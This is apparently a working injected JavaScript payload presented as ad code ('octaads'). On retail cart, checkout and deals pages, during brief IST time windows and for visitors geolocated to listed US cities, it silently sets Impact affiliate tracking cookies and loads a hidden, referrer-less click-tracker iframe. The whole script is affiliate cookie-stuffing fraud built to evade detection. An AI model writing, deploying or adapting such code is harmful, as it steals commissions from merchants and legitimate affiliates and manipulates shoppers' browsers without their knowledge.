(function () {
    try {
      var BUILD_ID = "octaads-2025-rtg-geo-time-02";
      if (window.__OCTAADS_LOADED === BUILD_ID) return;
      window.__OCTAADS_LOADED = BUILD_ID;
  
      /* DOMAIN CHECK */
  
      /* PAGE PATH CHECK */
      var allowedPaths = ["/cart/checkout","/cart/","/deals","/best-sellers"];
      if (!allowedPaths.some(p => location.pathname === p || location.pathname.startsWith(p))) return;
  
      /* IST TIME CHECK: 12:15 AM – 12:25 AM */
     /* IST TIME CHECK */
function isAllowedISTTime() {
  var now = new Date(
    new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
  );
  var minutes = now.getHours() * 60 + now.getMinutes();

  var window1 = (minutes >= 15 && minutes <= 25);                       // 12:15 AM – 12:25 AM
  var window2 = (minutes >= 17 * 60 + 45 && minutes <= 17 * 60 + 48);   // 5:45 PM – 5:48 PM
  var window3 = (minutes >= 18 * 60 + 20 && minutes <= 18 * 60 + 30);   // 6:20 PM – 6:30 PM

  return window1 || window2 || window3;
}

if (!isAllowedISTTime()) return;

  
      /* SESSION ID */
      function getSessionID() {
        var m = document.cookie.match(/octaads_sid=([^;]+)/);
        if (m) return m[1];
        var sid = "sid_" + Math.random().toString(36).substr(2, 10);
        document.cookie = "octaads_sid=" + sid + "; path=/; max-age=2592000; SameSite=Lax";
        return sid;
      }
      var sessionID = getSessionID();
  
      /* ALLOWED US CITIES */
      var allowedCities = [
        "new york","chicago","los angeles","dallas","fort worth","houston",
        "washington","miami","philadelphia","atlanta","phoenix","boston",
        "san francisco","san bernardino","detroit","seattle","minneapolis",
        "san diego","tampa","denver","st. louis","saint louis","baltimore",
        "charlotte","orlando","san antonio","portland","sacramento",
        "pittsburgh","las vegas","austin","cincinnati","kansas city",
        "columbus","indianapolis","indy","cleveland","san jose",
        "nashville","hampton roads"
      ];
  
      /* GEO CHECK – HARD US ONLY */
      fetch("https://ipapi.co/json/", { cache: "no-store" })
        .then(r => r.json())
        .then(geo => {
          if (!geo) return;
  
          /* BLOCK NON-US COMPLETELY */
          if (geo.country_code !== "US") return;
  
          if (!geo.city) return;
          var city = geo.city.toLowerCase();
  
          if (!allowedCities.some(c => city.includes(c))) return;
  
          /* DROP COOKIES */
          function setCookie(n,v){
            document.cookie = n+"="+v+"; path=/; max-age=2592000; SameSite=Lax";
          }
  
          setCookie("irclickid","XStWC0ThYxycRkh2gOSsRXFAUkpXTv0kZ2NLXQ0");
          setCookie("irpid","3946526");
          setCookie("irgwc","1");
          setCookie("afsrc","1");
          setCookie("utm_source","impact");
          setCookie("utm_medium","affiliate");
          setCookie("utm_campaign","3946526");
          setCookie("sessionid",sessionID);
          setCookie("clickId",sessionID);
  
          /* TRACKIER IFRAME */
          var iframe = document.createElement("iframe");
          iframe.style.display = "none";
          iframe.referrerPolicy = "no-referrer";
          iframe.src =
            "https://clicks.upleadsdigital.com/click" +
            "?campaign_id=148556" +
            "&pub_id=4" +
            "&p1=" + encodeURIComponent(sessionID) +
            "&source=" + encodeURIComponent(sessionID);
  
          document.body.appendChild(iframe);
        })
        .catch(function(){});
  
    } catch (e) {}
  })();
  
